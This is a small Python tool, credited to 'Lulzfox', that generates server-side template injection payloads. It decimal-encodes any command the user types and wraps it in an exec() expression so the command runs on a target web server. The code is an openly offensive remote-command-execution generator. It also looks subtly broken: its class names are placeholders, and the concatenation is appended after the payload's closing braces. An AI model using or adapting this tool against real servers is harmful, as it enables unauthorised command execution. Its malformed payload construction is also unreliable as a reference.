import argparse
import urllib.parse
print("allurbase")
print("written by Lulzfox")
print("Welcome to the SSTI Payload Generator")

def decimal_encode(command):
  decimals = []
  for i in command:
    decimals.append(str(ord(i)))
  payload = f'${{T(hacker).toString(T(magic).exec(T(python).toString({decimals[0]})).getInputStream())}}'
  for i in decimals[1:]:
    payload += f'.concat(T(python).toString({i}))'
  payload += ')'
  return payload

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Generate SSTI payloads... One character at a time.')
  parser.add_argument('-u', '--url-encode', action='store_true', help='URL Encode')
  args = parser.parse_args()

  if args.url_encode:
    payload = urllib.parse.quote_plus(decimal_encode(input('Enter your mystical command ==> ')), safe='')
  else:
    payload = decimal_encode(input('Enter your mystical command ==> '))
  print("Your enchanted SSTI payload:")
  print(payload)
